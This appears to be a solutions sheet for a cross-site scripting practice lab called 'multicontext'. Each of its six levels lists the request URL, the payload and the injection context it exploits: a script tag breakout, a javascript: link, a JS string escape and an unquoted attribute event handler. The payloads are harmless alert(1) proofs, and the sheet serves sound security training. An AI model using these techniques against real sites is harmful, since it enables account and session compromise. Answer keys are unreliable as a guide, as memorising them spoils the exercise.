# multicontext — solutions

Same input lands in multiple contexts; at least one is exploitable.

### multicontext-level1

`/multicontext/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: ignored in textarea, executes in `<div>`

### multicontext-level2

`/multicontext/level2/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: also lands in `<title>`, exploitable in `<a href="...">`

### multicontext-level3

`/multicontext/level3/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: lands in noscript and inside JS string; closing script tag breaks out

### multicontext-level4

`/multicontext/level4/?query=%27);alert(1);//`

- payload: `');alert(1);//`
- context: angles stripped; break out of JS string in onclick handler

### multicontext-level5

`/multicontext/level5/?query=x%20onmouseover=alert(1)`

- payload: `x onmouseover=alert(1)`
- context: unquoted attribute value — append event handler with whitespace

### multicontext-level6

`/multicontext/level6/?q1=a&q2=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>` in q2
- context: q1 encoded (safe), q2 raw in body
